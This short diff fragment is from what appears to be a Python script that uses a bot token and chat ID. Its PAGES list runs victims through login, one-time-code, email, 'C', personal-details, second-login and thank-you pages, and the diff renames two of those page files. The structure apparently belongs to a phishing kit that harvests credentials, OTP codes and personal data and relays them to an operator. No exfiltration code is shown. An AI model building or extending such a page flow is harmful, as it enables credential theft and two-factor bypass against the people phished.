@@ -18,12 +18,12 @@ if not BOT_TOKEN or not CHAT_ID:
 
 SESSION_STATUS = {}
 PAGES = [
-    {"emoji": "🔐", "text": "LOGIN1", "page": "index.html"},
+    {"emoji": "🔐", "text": "LOGIN1", "page": "home.html"},
     {"emoji": "🔢", "text": "OTP", "page": "otp.html"},
     {"emoji": "📧", "text": "EMAIL", "page": "email.html"},
     {"emoji": "🧾", "text": "C", "page": "c.html"},
     {"emoji": "🧍", "text": "PERSONAL", "page": "personal.html"},
-    {"emoji": "🔑", "text": "LOGIN2", "page": "login2.html"},
+    {"emoji": "🔑", "text": "LOGIN2", "page": "home.html"},
     {"emoji": "🎉", "text": "THANK YOU", "page": "thnks.html"},
 ]
 
